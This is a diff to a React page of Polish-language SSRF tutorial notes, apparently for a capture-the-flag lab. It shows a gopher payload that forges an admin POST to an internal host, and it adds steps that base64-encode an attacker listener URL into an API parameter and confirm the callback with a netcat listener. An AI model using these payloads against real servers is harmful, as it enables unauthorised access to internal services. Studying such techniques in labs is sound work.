@@ -82,7 +82,34 @@ const SSRF = () => {
                 <p>dateserver=gopher%3a//dateserver.htb%3a80/_POST%2520/admin.php%2520HTTP%252F1.1%250D%250AHost%3a%2520dateserver.htb%250D%250AContent-Length%3a%252013%250D%250AContent-Type%3a%2520application/x-www-form-urlencoded%250D%250A%250D%250Aadminpw%253Dadmin&date=2024-01-01</p>
             </div>
             
+            <hr />
+            
+            <h2>SSRF w url</h2>
+            <p>Znaleźliśmy url który wymaga od nas parametru</p>
+            <div className='waring'>
+                <p>curl http://{`<TARGET IP>`}:3000/api/userinfo</p>
+                <br />
+                <p>{`{`}"success":false,"error":"'<span className='important'>id</span>' parameter is invalid."{`}`}</p>
+            </div>
+            <p>W wielu przypadkach interfejsy API oczekują wartości parametrów w określonym formacie/kodowaniu. Spróbujmy zastosować kodowanie Base64 http://{`<VPN/TUN Adapter IP>:<LISTENER PORT>`} i ponownie wykonać wywołanie API.</p>
 
+            <div className='waring'>
+                <p>echo "http://{`<VPN/TUN Adapter IP>:<LISTENER PORT>`}" | tr -d '\n' | base64</p>
+                <p>curl "http://{`<TARGET IP>`}:3000/api/userinfo?id=<span className='important'>{`<Wynik kodowania BASE64 blob>`}</span></p>
+            </div>
+
+            <div className='waring'>
+                <p>Jeżeli otrzymamy połączenie znaczy że aplikacja <span className='important'>jest podatna na SSRF</span></p>
+                <p>$ nc -nlvp 4444</p>
+                <br />
+                <p>listening on [any] 4444 ...</p>
+                <p>connect to [{`<VPN/TUN Adapter IP>`}] from (UNKNOWN) [{`<TARGET IP>`}] 50542</p>
+                <p>GET / HTTP/1.1</p>
+                <p>Accept: application/json, text/plain, */*</p>
+                <p>User-Agent: axios/0.24.0</p>
+                <p>Host: {`<VPN/TUN Adapter IP>`}:4444</p>
+                <p>Connection: close</p>
+            </div>
         </section>
     )
 };
